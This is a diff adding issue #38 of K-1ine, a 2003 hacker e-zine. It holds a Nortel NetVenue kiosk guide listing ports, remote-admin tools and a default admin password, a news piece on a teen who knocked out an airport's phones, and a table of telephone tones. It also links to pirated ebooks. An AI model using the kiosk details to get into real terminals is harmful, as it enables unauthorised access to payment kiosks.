@@ -1,0 +1,3468 @@
+
+     __             _____  __            ___ _            ______ __ _        _
+       __      ___ / _   __                                        ____ _   ( )
+              ___)\ /______   ______
+ _________       \  / ___  _____ ___)\    ___   __.
+       _____     |   /_             \ |  /_    /  |
+           ___\  |  (/               || //  _   | |   _   __  __      _  
+     _       _\\ |  |     _______    |:(/  ( )  | |  ( )  ) \/_ \   /( )\
+    ( )        \\|  |   /_ ____      ||\\       | |  | |  | |  ) ) /  ___)
+                \\  |  //__          || \\      | |  | |  | |  | | \ (___ __ _
+                 \) | //             ||  \\_  __| |__| |__| |  | |_ \_______ __
+                 |  |//      ____ __/ |   \___    ____   _ _    _    _      _
+    __ ______)   |  (/      / __ __ )/
+              \ \|  |      / /
+               \ \ (\_____/ /___  _                                         ___ _
+      ____      \ ) \____ _____ __ __ 	  Beat up a whiney Emo Kid          _ _
+     ( 38 )      |  |
+
+
+         c/a   4.2003.
+
+
+_________________________________________________________________________________
+
+ » .- Words from the Editor -. «                                                |
+
+ *: [-] Introduction ............................................ The Clone    :*
+ *: (-) Contact Information ..................................... The Clone    :*
+ *: (-) Link of the Month ....................................... Phlux        :*
+ *: (-) K-1ine Mirrors .......................................... The Clone    :*
+ *: (-) GHU.CA Switching Hosts .................................. The Clone    :*
+ *: (-) Toronto 2600 News - NOR/\D Radio ........................ Caesium      :*
+_________________________________________________________________________________
+
+ » .- Documents -. «                                                            |
+
+*: (x) 'A Guide to the Nortel NetVenue Terminal' ................ Magma/Clone  :*
+*: (x) 'When a Journalist and a Prosecutor Lie to the Public++' . The Clone    :*
+*: (x) 'First Data and Concorde: The World's Biggest Banks Merge' MsO	       :*
+*: (x) 'Misc Tones Used In National Networks' ................... TiTaNiA      :*
+*: (x) 'Perl Code for Security Auditing Yahoo E-mail Passwords' . GrassMunk    :*
+*: (x) 'Fucking With Peoples Sensibilities' ..................... Caes / Coer  :*
+*: (x) 'BloodFlame's Guide to Eating Free' ...................... BloodFlame   :*
+_________________________________________________________________________________
+
+ » .- K-1ine News Bytes -. «							|
+
+*: (x) 'Voicemail Hackers Phone It In' .......................... Wired News   :*
+*: (x) 'TIME-TRAVELER BUSTED FOR INSIDER TRADING' ............... Yahoo! TV    :*
+_________________________________________________________________________________
+
+ » .- Conclusion -. «                                                           |
+
+ *: [-] Credits ................................................. The Clone    :*
+ *: [-] Shouts .................................................. The Clone    :*
+_________________________________________________________________________________ 
+
+
+
+ Welcome to the latest issue of K-1ine #38 'Beat up a whiney Emo Kid'. I would like
+ to thank everyone who submitted articles to me - you sent me so many! Enjoy this
+ issue of K-1ine zine, and if you forget to send me more articles in the future, I
+ will hold your family responsible for any pains that you cause me and my colleagues.
+
+ Also, if you haven't noticed, I have added a section called "News Bytes" that will
+ contain interesting and K-1ine worthy news articles that myself or others have find
+ across the Internet. Please do not submit News Bytes and expect to have your name on
+ the credits. That's just fucking lame. If you're going to submit something, submit an
+ article in addition to the news story. I wouldn't normally add this disclaimer, but I
+ know of a lot of lazy people who will do anything to get their damn nicknames whored.
+ 
+
+			Now do yourselves a favor and...
+
+
+		      Have a Super Extra Corporate Day!
+
+ -`
+
+ -->
+
+ Contact Information;
+ 
+ Comments/Questions/Submissions: theclone@hackcanada.com
+
+ Check out my site: (Nettwerked) http://www.nettwerked.net
+
+ -
+
+ -----------------------------------------------------------------------
+
+
+  --=[ LINK OF THE MONTH ]=--
+
+ Every month I post one really great "link of the month" on every issue
+ of K-1ine magazine. The link can be anything in the technology industry,
+ music scene, rave scene, punk scene, or even a good article you read on
+ a news site. I'll be taking submissions via e-mail or IRC right away; so
+ get your links in and maybe you'll see it in the next issue of K-1ine!
+
+  For the month of April, the link of the month is:
+
+  https://filez.mojo.cc/Mojo_BookShelf/SciFi%20&%20Fantasy/DUNE%20(F.H.)%20All%208%20Books/
+
+  "All 8 Dune Books in Digital Format" [... one is an .exe the other are .pdf's]
+
+  [submitted by: Phlux]
+
+ --
+
+
+	  K-1ine Mirrors:
+
+
+ http://www.mirrors.wiretapped.net/security/info/textfiles/k1ine/
+
+  (Now mirrored in two places, one in Belgium and another in Sydney)
+
+ "Wiretapped.net is an archive of open source software, informational
+ textfiles and radio/conference broadcasts covering the areas of network
+ and information security, network operations, host integrity, cryptography
+ and privacy, among others. We believe we are now the largest archive of
+ this type of software & information, hosting in excess of 20 gigabytes of
+ information mirrored from around the world."
+
+ --
+ 
+ http://www.hackcanada.com/canadian/zines/index.html#K-1ine
+
+ Hack Canada - Canadian H/P - E-Zines
+
+ --
+
+
+ http://www.stealthiscomputer.org/k-1ine.html
+
+ Steal This Computer - K-1ine Archive
+
+ --
+
+ http://www.to2600.org
+
+ Toronto 2600 - K-1ine Archive
+
+ ---
+
+
+
+	 [ GHU.CA Switching Hosts ]
+
+ For those of you who have been trying to reach GHU.CA for the past several days
+ without any luck, it's because Magma (its founder and webmaster) has switched
+ over from a shitty host, to hosting from StealThisComputer.org! Yes, that is
+ correct. Our good pal Wizbone has graciously adopted ghu.ca and given it a
+ safe place to live. Lets all tell Wizbone how much we adore his kindness.
+ E-mail Wizbone: wizbone@stealthiscomputer.org, Subject "We Lub joo Wizzy!"
+
+
+ - -
+
+
+ [ Toronto 2600 News - NOR/\D Radio ]
+
+ By: Caesium
+
+ http://www.to2600.org/norad.php
+
+ NORAD Radio is a new internet weekly radioshow idea conceptualized
+ from myself, caesium.
+
+ The show will feature a panel of Toronto 2600 members, with frequent
+ appearances by The Clone. The show will be hosted by dec0de, produced
+ by caesium and infrastructure engineering by grinthock. We plan to
+ discuss relevant issues to the Canadian underground and various other
+ interests. This show will be streamed by several volunteers using
+ SHOUTcast MP3 streaming technology (amoungst several other techno-
+ logies). This biweekly radio show will also be a call-in show which
+ should prove interesting. Live, uninhibited, underground.
+
+ We are sure with the right help and suggestions that we can turn this
+ show into a success. We are currently designing and engineering the
+ infastructure that will make this live, nationally produced radio show
+ possible.
+
+ We hope to have it pilot sometime in May or June. If you have any ideas,
+ concepts or otherwise, please contact caesium at caesium@toronto2600.org. 
+
+ 
+--
+
+
+
+
+		 A Guide to the Nortel NetVenue Terminal
+
+
+  * Written by: Magma and The Clone 
+  * Thursday, April 17, 2003
+
+  > Magma's web-site: www.ghu.ca
+  > The Clone's web-site: www.nettwerked.net
+
+  Dedicated to Nettwerked.net's 4 year anniversary on the Internet. 
+
+  Disclaimer: This document was written as a source for information pertaining to the
+  Nortel NetVenue Internet Kiosk Terminal. We have made every attempt to gather as much
+  information as possible from various public sources, and from our own personal (comp-
+  letely legal) research. We wrote this NetVenue document to teach the Internet community
+  about this interesting technology. If you abuse any of the details mentioned on this
+  paper, then you are responsible for your actions. We won't be held accountable. 
+
+
+
+  T a b l e   o f   C o n t e n t s
+
+
+  * An Introduction to the NetVenue 
+  
+  * Hardware Specifications 
+  
+  * Software Specifications 
+
+  * Hardware Architecture Details 
+
+  * Software Architecture Details 
+
+  * Photographs in Toronto 
+
+  * Locations in Canada 
+
+  * The Conclusion to this Paper 
+
+  * Credits and Shout Outs 
+
+
+  -
+
+  An Introduction to the NetVenue:
+
+ It is believed by some that Internet Kiosks, are the future of public pay telephone.
+ Despite huge profit losses by telecommunications giant by Nortel Networks which saw
+ a third quarter loss of $1.8 (US) billion, has slashed its work force, and has hacked
+ away at its product lines, it still continues to exist as a market leader.
+
+ One such product that Nortel Networks has recently stopped manufacturing and licensing
+ to markets (but many resellers still offer in parts of Canada and the United States)
+ is the NetVenue Terminal. The NetVenue is a robust, low maintenance next-generation
+ Millennium public access terminals which is used to deliver IP-based services and
+ applications.
+
+ The NetVenue is available in two platforms; the "Java Terminal" (Windows-NT based) and
+ the "Mac Terminal" (MAC OS-9 / X based), and offer colour touch screens with card readers,
+ receipt printers for e-commerce, a docking station enclosure house, a Debit Machine, a
+ handset for POTS services, a keyboard and trackpad for Internet surfing capabilities.
+
+ The broad classes of services most important to public IP access are currently seen as:
+ Messaging services like e-mail Internet access (Web browsing), Form-entry services for
+ markets such as banking and government services, Electronic Commerce applications such
+ as ticketing and virtual malls, and Entertainment for gaming, online gambling, and 
+ Cyber-Sex0ring in chat rooms. 
+
+ This paper will discuss the technical aspects of this beautiful piece of technology by
+ outlining and describing the hardware, the software (applications), locations, photographs,
+ and more! We hope you enjoy this document, and we look forward to your feedback and updates.
+ I certainly wish we could of released this document when the NetVenue was a brand new product,
+ but it wasn't until recently that Magma and The Clone were able to acquire most of the details
+ on it.
+
+
+ [ Hardware Specifications ]
+
+ 
+   Mac Terminal Details
+
+ * Credit Card Support: NDCSNS Millennium 
+ * Interac Debit Card Support: YES 
+ * Stored Value Smart Card Support: YES 
+ * Receipt Printer: Swecoin 
+ * Remote Control: Timbuktu Pro 
+ * Hardware Platform: PowerPC 700 (or better) series 
+ * Additional Serial Ports: Port Juggler / Doubler 
+ * Power Reset: Via Payphone Rebound Device 
+
+
+   PC Terminal Details
+
+ * Credit Card Support: SNS Millennium ACS 
+ * Interac Debit Card Support: YES 
+ * Stored Value Smart Card Support: YES 
+ * Receipt Printer: Swecoin 
+ * Remote Control: NetOp 
+ * Hardware Platform: Intel Celeron 300A (or better) series 
+ * Additional Serial Ports: PCI Serial Card (2 port or 4 port) 
+ * Power Reset: Hardware watchdog
+
+ 
+
+ [ Software Specifications ]
+
+
+  Mac Terminal Details
+
+ * Network-based: YES 
+ * Java Services: NO 
+ * Native Services: NO 
+ * Web Browser: Customized Netscape Navigator 6X/7X/etc. 
+ * Web Service content: HTML 4.0+ / Java 1.1+ Applets Dynamic 
+ * API Support: HTML API 
+ * Operating System: MacOS 8.5.1 / 9 / or X. 
+ * Local Cache: Oracle Lite 
+ * Number of Attract Loops: Up to 61 
+ * Printing in Progress Dialog: YES 
+ * Software Volume Control: NO 
+ * Graphic Types in menus: GIF, JPG, PICT 
+ * Video Display: 14" LSD 
+ * Progress Indicator: YES 
+ * Disable API per service: NO 
+ * Transition Effects: QuickTime Video 
+ * Sound Services: QuickTime 
+
+
+  PC Terminal Details
+
+ * Network-based: YES 
+ * Java Services: YES (JDK 1.2) 
+ * Native Services: YES (Active X) 
+ * Web Browser: Internet Explorer 5X/6X 
+ * Web Service content: HTML 4.0+ / JavaScript 1.2+ 
+ * API Support: ActiveX API, HTML API, and JAVA API 
+ * Operating System: Windows NT Workstation 4.0 (or Windows 2000) 
+ * Local Cache: Java 
+ * Number of Attract Loops: Up to 61 
+ * Printing in Progress Dialog: YES 
+ * Software Volume Control: YES 
+ * Graphic Types in menus: GIF, JPG 
+ * Video Display: 15" LSD 
+ * Progress Indicator: YES 
+ * Disable API per service: YES 
+ * Transition Effects: Java Media Framework 
+ * Sound Services: Windows Media Player 
+
+
+
+ [ Hardware Architecture Details ]
+
+
+ Remote Administration Functions:
+
+ All updates to the Nortel NetVenue Terminal are done through the software known
+ as 'NetOp Remote Control', which is used at the carrier's NOC (Network Operations
+ Centre), or at the owner's location of business. NetOp Remote Control allows the
+ system administrator to control the Nortel NetVenue Terminal's keyword, mouse, and
+ basic to advanced functions all via a user- friendly Windows GUI. Details on ordering
+ this product are available at: this web-page.
+
+ Be sure to request a FREE TRIAL, and try it before you buy it.
+ NetOp Remote Control is quite an interesting piece of software.
+
+
+ Credit Card Transactions: 
+
+ All credit card transactions in the Nortel NetVenue are processed via the customized
+ payment gateways which are completely supported by Nortel Network's Kiosk internal
+ terminal software. The NetVenue uses a third-party clearinghouse to authorize and
+ clear or deny credit cards for Pay-per-Use and purchases via service APIs. The Nortel
+ NetVenue will communicate with the credit card clearinghouse's host over TCP/IP, and a
+ proprietary protocol that is completely defined by the particular authorization company. 
+
+
+ Shared Network Services: 
+
+ - Canada -
+
+ Shared Network Services (SNS) provides credit card authorizations in Canada. Transactions
+ are configured to be automatically settled by SNS who provide a settlement file back to the
+ 'NetVenue Management System'. SNS also provides credit card transaction reports to the Net-
+ Venue Kiosk merchant clients.
+
+ - United States -
+
+ NDC (formerly 'Global Payment Solutions') provides card authorizations for U.S. dollar tran-
+ sactions and U.S. merchant clients. ACS provides automatic settlement for these credit card
+ transactions.
+
+
+
+ Millennium Authorization:
+
+ Card authorizations via the Kiosk can be performed by the payphone component of the terminal
+ if the Netvenue payphone is in direct communication with the Nortel 'Millennium Manager'.
+ These authorizations are for fixed amounts configured on the Millennium Manager. This amount
+ is also fixed across all services that use Millennium card authorizations.
+
+
+ The NetVenue Smart Card Service:
+
+ Interac Debit card support is provided by a Debit Software Component in the Java Terminal
+ in conjunction with a third party device manufactured by a company known as Nova Enterprise
+ Solutions. The support provides for multiple merchant debit card transactions. This means
+ that more than one merchant can accept debit cards as payment on a single terminal. The
+ Nova device communicates with an "IVI Vending Pad" for PIN entry and prompting. It also
+ clears the debit card to the financial institution via a separate physical connection to
+ the bank's secure host computer. The Vending Pad provides most of the security since it
+ contains the various security keys and performs all of the encryption/decryption of messages
+ sent to the particular bank. The current implementation provides basic debit card support for
+ a small number of terminals due to the high costs and maintenance: each Nortel NetVenue
+ terminal requires a separate PayBox and a Datapac '3201' (transaction protocol) line for NUI-
+ based connections. To learn more about the Datapac system, be sure and refer to this Hack
+ Canada document. 
+
+
+ The NetVenue Keyboard:
+
+ The NetVenue's keyboard kinda reminds me of the Millennium TTY Terminals found in most public
+ places in Canada. The keyboard has a mouse-button near the credit card slot for moving the
+ mouse cursor, and a separate clicker button. It has a QWERTY keyboard with many of the same
+ keys you'd find on an average 101, and two types of data jacks; RJ-11 for dial up connections,
+ and an Ethernet jack for tappin' on to the high speed with your laptop or PDA. The NetVenue
+ terminal maps character keys according to the letters on the dialpad, and characters that are
+ not supported such as "!" are not mapped to any input. Any keyboard buttons that are not valid,
+ provide no audible response to the user. For example, if the user presses "!" on the keyboard,
+ this has no effect within the GUI application.
+
+ For a visual depiction of the keyboard, scroll down and view the photographs.
+
+
+
+ Volume (up and down) buttons:
+
+ You guessed it; the volume buttons are used for increasing and decreasing the volume in the
+ NetVenue's handset. It doesn't affect any of the terminal's multimedia audio volume as they
+ are set to a factory setting or pre-set by the administrator.
+
+
+ Next Call button:
+
+ This button acts similar to the existing Millennium payphone's "Next Call" button. The Next Call
+ button different has results depending on when it's pressed. During call set up, this key acts as
+ a correction. If the customer is typing in a number and they press the "Next Call" button, the
+ dialed number is blanked out. If the user is on a call, pressing this key allows the user to
+ initiate another call using any existing credit. The next call may also initiate additional 
+ credit authorization.
+
+
+ Language button:
+
+ The language is primarily in English, unless the phone is located in places like Quebec, then it
+ would be French by default. You can change the language the NetVenue displays and says (on the
+ voice prompts) by pressing the Language Key once. The language service is synchronized with the
+ Multimedia primary language via the "PC-to-Payphone" interface protocol. 
+
+
+ Forgotten Card Alarm:
+
+ The forgotten card alarm audible sound file is played on the PC's multimedia speakers when a card
+ is left in the card reader at least 5 seconds after the customer hangs up the receiver on the Net-
+ Venue. This sound file is configurable via the back-end Multimedia Server, so if you ever wanted to
+ change it, you could. It would be especially entertaining to change the forgotten card alarm from
+ the usual "dee-doo-dee-doo" to "hey idiot, you forgot your card in me!" :)
+
+
+ Rate Table Updating:
+
+ On a regular basis, the Nortel NetVenue will connect via POTS copper lines to the remote server
+ running Millennium Manager to update its rate tables and software (for upgrades, security patches,
+ etc). How does the NetVenue know when to update its records? The NetVenue software runs on a task-
+ list or 'cron', and usually updates at the same time every day. Sometimes the service provider will
+ set the NetVenue to dial out to the Millennium Manager at various times throughout the week or month. 
+
+
+
+ [ Software Architecture Details ]
+
+
+ Electronic Mail:
+
+ The Nortel NetVenue has the ability to allow a user to check their e-mail through two ways; web-based
+ services on the Internet (i.e. Hotmail) and through POP3. If a customer decides to check their e-mail
+ through the POP3 protocol, Nortel NetVenue will politely prompt the user to enter their POP3 e-mail
+ account ID and password. As soon as that information is entered, the user will then need to press the
+ log on button and begin sending and receiving e-mail as well as deleting, replying to, printing (if
+ applicable), moving, jumping to the next and/or previous message. However if the user messes up and
+ enters either invalid login or password info, NetVenue will prompt them a few times before quitting.
+
+ E-mail Attachments are not supported for reasons of security. Denying the user the ability to attach
+ files, will significantly cut down on the chances of viruses and trojans being sent from the user.
+
+
+ Service APIs:
+
+ There are several API commands that can be used to access the NetVenue's functionality for reading
+ cards, clearing cards, printing receipts, printing tickets, and dialing telephone numbers for the
+ customer. For your convenience (heh), here are the API commands it uses. Remember, many of these
+ commands require the Nortel NetVenue to have a laser printer installed. Don't even bother if it
+ doesn't, mmmkay?
+
+
+ "Print PostScript File"
+
+ This command prints one or more PostScript files stored on the hard drive to the system laser printer.
+ The Print PostScript File command is useful for printing forms such as insurance/government forms, etc.
+
+
+ "Print Receipts / Coupons"
+
+ This command (you guessed it!) prints receipts and coupons. Intriguing.
+
+
+ "Print Current Web Page"
+
+ This command prints the content of a HTML page to the system's default printer while a user is online.
+
+
+ "Exit Service"
+
+ This command will let you exit the service.
+
+
+ "Print Ticket" (requires a ticket printer)
+
+ This command lets you print tickets. Fun.
+
+
+ "Dial Phone Number"
+
+ This command by default will dial the telephone number as configured in the terminal database by the
+ NetVenue administrator. One can enter any number they wish here, including extensions for voice-mail
+ and/or customer service on PBX's.
+
+
+ "Read, Clear Card"
+
+ This command tells the NetVenue terminal to request that the user insert their credit / debit-card for
+ transactions. Only the administrator can configure the "Result URL" in the server using the administr-
+ ation tool which is user ID and password protected (set to a factory default, and never changed).
+
+
+ Encryption:
+
+ The Nortel NetVenue uses Secure Sockets Layer (SSL 128bit) over Internet transactions that is provided
+ by the Internet Explorer / Netscape browsers. For Datapac based transactions, proprietary encryption
+ over the data lines is used as well as encryption at the remote server. If the administrator does not
+ have an SSL compatible server, the customer will NOT be able to use SSL features on the NetVenue.
+
+
+
+ NetVenue's TCP/IP Ports & Protocols:
+
+ The following is a list of network protocols and ports that are used by the NetVenue Terminal...
+
+
+ * STCP/UDP, port 53 -- Used by the NetVenue Internet Services. Also used in the operating system,
+   and Java software for the PC version of the NetVenue.
+
+ * FTP port, 21 -- There is no FTP server is installed on the NetVenue terminal. Bunk. :-/
+
+ * LPRTCP, port 515 -- This is used by the "Windows TCP/IP Printing Service" when printing Web pages
+   from within a certain Web service and/or by the system's default laser printer.
+
+ * BOOTP/DHCPUDP, port 68 -- Not currently enabled. 
+
+ * Web-Server, port 80, 8080 - Used for outgoing Internet usage. 
+
+ * TCP, port 443 (SSL) -- Used primarily by the Web service. HTTP can also use other ports, depending
+   on how the web server is configured.
+
+ * Oracle's Thin Client ODBC driver / JDBC, Port 1521 -- JDBC/TNS/SQL*net Used by the Java software
+  for connections to its security database.
+
+ * Nortel Java S/WGPS, Port 15126 -- For Global Payment Solutions for all United States credit card
+   authorizations.
+
+ * SNS, Port 1076 -- for Shared Network Services (SNS) for all Canadian credit card authorizations.
+
+ * PAP, Port 9100 -- Uses TCP/IP sockets for printing postscript files directly from the "HTML API"
+   command.
+
+ * Timbuktu Proprietary UDP (Mac only), port 407
+
+ * Observation, Control, File Transfers, port 1417, 1418, 1419, 1420 
+
+ * Notification, Chat, Intercom, ports 1023. 
+
+ * NetOp Proprietary TCP, port 6502 -- Uses a single port
+
+ -
+
+
+ Photographs in Toronto:
+
+ The following photographs were taken at Union Station in
+ Toronto by Dec0de (of Toronto2600 - www.toronto2600.org)
+
+
+  http://www.nettwerked.net/netvenue1-big.jpg
+ 
+  (Side shot of the NetVenue's keyboard.
+   Very impressive... super-hero like-even!)
+
+
+  http://www.nettwerked.net/netvenue2-big.jpg
+ 
+  (Front shot of the NetVenue Terminal.) 
+
+
+  http://www.nettwerked.net/netvenue3-big.jpg
+ 
+  (Check out the keyboard on this baby.)
+
+
+  http://www.nettwerked.net/netvenue4-big.jpg
+
+  (Very nice screen / dial-pad shot. Phearsome.)
+
+
+ -
+
+  Locations in Canada:
+
+ As far as I know, the only locations that were ever noted was the one in Toronto
+ (pictures above), and one in Montreal. Both of these were services offered by Bell
+ Canada. At the end of 2002, the contract that Bell had with Nortel expired. Bell
+ decided not to renew the contract and decided to go with another company (King
+ Products) and is now offering public services using the cc100 terminals. The cc100
+ terminals are interesting, but lame in comparison to the vast features the NetVenue
+ offers. Western Canada MAY still adopt the NetVenue for services; particularly by
+ telephone companies such as Telus Communications. The United States is said to have
+ many NetVenue terminals in use by small telecom service providers. A friend of a
+ friend in New Jersey works for a company that sells these NetVenue's, so eastern USA
+ is definitely utilizing these. 
+
+
+ The Conclusion to this Paper:
+
+ There you have it; the most comprehensive document you've probably ever read on the
+ Nortel NetVenue Terminals. We sincerely hope you enjoyed this paper, and we hope to
+ hear your feedback, and receive any tips and/or corrections.
+
+
+ The future of the payphone industry appears to be that of the
+ Internet Kiosk terminals. Will they last? Only time will tell. 
+
+
+ Credits and Shout Outs:
+
+ Magma and The Clone would like to give credit to Dec0de for his excellent photographs.
+
+
+ Shout Outs:
+
+ Hack Canada, The Grasshopper Unit / Nettwerked, Toronto 2600, StealThisComputer.org,
+ PacketNinja.ca, SmartestGirls.com, and lastly to the Nortel Networks NetVenue engineers.
+
+
+
+  --
+
+
+  Reporter Comments: When a Journalist and a Prosecutor Lie to the Public
+
+
+  * Date: Tuesday, April 8, 2003
+
+  * Introduction by: The Clone
+
+  * Web-site: WWW.NETTWERKED.NET
+
+
+  This file is a continuing saga. Read the original article first.
+
+
+  Introduction:
+
+  I recently received an e-mail from a Toronto Star reporter by the name
+  of Rachel Ross, who found the Nettwerked article pertaining to the
+  Alberta prosecutor Steven Bilodeau, and the mis-information spread
+  within the pages of the Edmonton Journal by editor Keith Gerein.
+  
+  She had some comments to make, and some information to share regarding
+  the claim that Steven Bilodeau made regarding the Massachussetts
+  teenager's apparent airport / power-grid shenanigans. So now it seems
+  that the false claim Steven Bilodeau made was actually loosely based
+  off of the truth. One thing though; in the Edmonton Journal article,
+  Steven Bilodeau claimed that the Massachussetts teenager was able to
+  shut down the power-grid and airport lighting system easily just by
+  hooking onto a "switch box" with a device - it sounded all too similar
+  to a lineman's handset.
+
+  So the truth is the teenager disabled the lighting system at an airport
+  and supposedly interrupted telephone service at a nearby town in Rutland.
+  HOWEVER, I don't see where it says anything about disabling power, either
+  than the article making a really bad analogy: "Just as disabling a circuit
+  breaker box blacks out an entire house, so disabling a loop carrier system
+  cuts off all communications with the telephone lines it services". Heh.
+
+  Thanks to a REAL reporter Rachel Ross from the Toronto Star doing her homework,
+  we now know that we should never take what we read in the media as absolute
+  truth just because it happens to be printed word. Rachel, the Canadian hacker
+  community salutes you. Steven Bilodeau, shame on you for telling lies. Keith
+  Gerein, shame on you for spreading the blatant libel in a city-wide newspaper.
+  Don't think you're getting off that easy, Keith; I've convinced several of my
+  close friends, family members, and readers to boycott the Edmonton Journal for
+  the bullshit it published!
+
+  I want to send a special thanks to Anonymous_Hero for the original contribution
+  to this story. When readers like you speak out, everyone wins.
+
+
+  The Truth...
+
+
+  From RRoss@thestar.ca Fri Mar 28 21:44:33 2003
+  Return-Path: 
+  Received: (qmail 22870 invoked by alias); 28 Mar 2003 21:44:33 -0000
+  Delivered-To: 6-theclone@hackcanada.com
+  Received: (qmail 22865 invoked from network); 28 Mar 2003 21:44:32 -0000
+  Received: from unknown (HELO MAILRELAY.thestar.ca) (192.206.151.161)
+  by 0 with SMTP; 28 Mar 2003 21:44:32 -0000
+  Received: from [Masked] by MAILRELAY.thestar.ca with ESMTP id ukhbbaaa for
+  theclone@hackcanada.com; Fri, 28 Mar 2003 16:44:30 +-0500
+  Received: by exchange.thestar.ca with Internet Mail Service (5.5.2653.19)
+  id ; Fri, 28 Mar 2003 16:44:40 -0500
+  Message-ID: <926E485C3A6E594C94F2745357AC8B55170DCC@mail4.thestar.ca>
+  From: "Ross, Rachel" 
+  To: "'theclone@hackcanada.com'" 
+  Subject: Comment Re: Issue 37
+  Date: Fri, 28 Mar 2003 16:44:15 -0500
+  MIME-Version: 1.0
+  X-Mailer: Internet Mail Service (5.5.2653.19)
+  Content-Type: multipart/mixed; boundary="==_21443078399065==_"
+  X-AntiVirus: Checked for viruses by Gordano's AntiVirus Software
+  X-AntiSpam: Checked for restricted content by Gordano's AntiSpam Software
+  Status: RO
+  X-Status: A
+  Content-Length: 9028
+  Lines: 197
+
+  I found the article 'When a Journalist and a Prosecutor Lie to the Public'
+  interesting and decided to look into the "tale" of the teen hacker who
+  allegedly shut down the power grid and runway lights. At minimum, it sounded
+  a little ridiculous. I think I know the incident that the reporter was trying
+  to describe. I've pasted a news story about the incident below. It appears as
+  though the teen didn't take out a power grid, but he did manage to disable a
+  remote control system for some runway lights. (I guess they could still run out
+  there and switch the darn lights on the runway but what a pain in the ass.)
+  Anyway, I just thought your readers might be interested in the real story.
+
+  Cheers,
+  Rachel
+
+  P.S. All reporters do not suck. No really, we don't.
+       Well, some of us TRY not to anyway.
+
+
+ Teen hacker charged with disabling airport control tower telephones
+ 18 March 1998
+
+ BOSTON, March 18 (AFP) - A teenage computer hacker was charged Wednesday
+ with disabling telephones and control tower services at a Massachussetts
+ airport, the Justice Department said.
+
+ The incident last spring virtually shut down the Worcester, Massachussetts
+ airport, and also interrupted phone service in the nearby town of Rutland.
+
+ The lead federal investigator on the case, Secret Service Special Agent
+ Michael Johnston said the case was one of the agency's "most significant
+ computer fraud investigations," and had significant "national security
+ ramifications."
+
+ The charges unsealed Wednesday were the first brought by the federal government
+ against a juvenile for computer crimes. "Computer and telephone networks are at
+ the heart of vital services provided by the government and private industry, and
+ our critical infrastructure. They are not toys for the entertainment of teenagers,"
+ said US Attorney Donald Stern, in a press release.
+
+ "Hacking a computer or telephone network can create a tremendous risk to the public
+ and we will prosecute juvenile hackers in appropriate cases, such as this one," Stern
+ said. Under a plea agreement, prosecutors said the youth would receive two years'
+ probation, during which he will not be allowed to own or use a computer modem. He must
+ also pay restitution to the phone company and perform 250 hours of community service.
+
+ Officials did not release the name of the youth because of his age. Prosecutors said
+ the incident occurred March 10, 1997, when the teenager hacked into remote computers
+ called "loop carrier systems" that move voice and data transmissions from older copper
+ telephone lines to more sophisticated fiber-optic cables.
+
+ "Just as disabling a circuit breaker box blacks out an entire house, so disabling a
+ loop carrier system cuts off all communications with the telephone lines it services,"
+ Stern explained.
+
+ Worcester Airport in eastern Massachusetts had no telephone service for six hours, nor
+ did the airport's fire department or security system, the statement said. A remote
+ control systems operating runway lights also failed.
+
+ On the same day, the teenager also broke into a Worcester pharmacy computer and ordered
+ it to transmit to his computer information on all prescriptions filled the previous week. 
+
+ ---
+
+
+
+
+     First Data and Concorde - The World's Biggest Banks Merge
+		
+     
+    CORPORATE NAME        VOLUME BY STOCK       DOLLAR
+
+    First Data            23,697,300            813.1
+    Concord Efs INC       49,925,900            620.3
+    IBM                   7,280,100             593.0
+    Citigroup             15,058,000            555.3
+    Altria Group          18,425,500            538.4
+
+ These were the top 5 stocks at close of April 2, 2003 on the
+ New York Stock Exchange.  This might not be of issue to anyone,
+ but the top two companies on this list merged today.  These
+ companies are not IT, or even arms related.  This merger
+ announced today was of the two largest banking conglomerates
+ in the world.
+
+ First Data owns Western Union, and processes 7 out of every
+ 10 credit card transactions in the world.  Concord was their
+ rival until a few hours ago.  The banking world is not unlike
+ the Internet.  There are only 3 bank "backbones" that all other
+ banks lease their access to Visa and Mastercard through.  Like
+ the clergy in the Catholic church, if you need to speak to God,
+ or get a credit card authorized, you do it through them.
+
+ Today's merger cuts this down to two.  With the American people
+ so caught up in the war, perhaps these banks believe no one is
+ paying attention to Anti-trust legislation and homing in on the
+ plight of the recently rescued Jessica Lynch instead.
+
+ The new First Data is slated to generate $10 Billion in annual
+ revenue.  In an article with Reuters, First Data Chief Executive
+ Charlie Fote said he was confident the deal would clear those
+ hurdles. "We feel pretty good about the antitrust issue,".
+ I think Bill Gates said the same thing once upon a time.
+
+ -MsO
+
+
+ --
+ <theclone> I was at the store today and I mentioned how the US is
+ using missiles with depleted uranium attached to them, and she
+ looked at me and asked "uranium? IS that some flower or something?"
+ --
+
+
+
+
+		Misc Tones Used In National Networks
+		
+		Brought to you by: TiTaNiA for those sexy canadians!
+
+
+Disclaimer: Results may vary. This list is current, but there is no
+standards for such tones. (they are kinda sorta in alphabetical order
+
+
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+COUNTRY/TONE    FREQ(Hz)/CADENCE(s)econds)X
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+Albania (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.15 on 0.15 off
+	Dial tone -	425	continuous
+	Pay tone -	12000
+	Ringing tone -	425	1.2 on 4.65 off
+	Special information tone -	425	0.2 on 0.2 off
+	Call waiting tone -	425	0.2 on 0.6 off
+
+Algeria (People's Democratic Republic of)
+	Busy tone -	450	0.5 on 0.5 off
+	Ringing tone -	25//50	1.5 on 3.5 off
+
+Germany (Federal Republic of)
+	Busy tone - I	425	0.48 on 0.48 off
+	Busy tone - II	425	0.5 on 0.5 off
+	Congestion tone - I	425	0.24 on 0.24 off
+	Congestion tone - II	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Special dial tone -	425+400	continuous
+	Holding tone -	425	0.15 on 0.15 off 0.15 on 8.0 off
+	Payphone recognition tone - I	1633/1336	5x(0.2 on 0.2
+                                                         off 0.2 on 2.0 off)
+        Payphone recognition tone - II  900     0.2 on 0.2 off 0.2 on
+                                                         0.2 off 0.2 on
+	Ringing tone - I	425	1.0 on 4.0 off
+	Ringing tone - II	425	0.25 on 4.0 off 1.0 on 4.0 off
+                                                        1.0 on 4.0 off
+	Special information tone - I	900/1400/1800	3x0.33 on 1.0 off
+	Special information tone - II	950/1400/1800	3x0.33 on 1.0 off
+	Warning tone - operator intervening	425	0.24 on 0.24
+                                                        off 0.24 on 1.28 off
+	Call waiting tone - I (2)	425	0.2 on 0.2 off 0.2 on 5.0 off
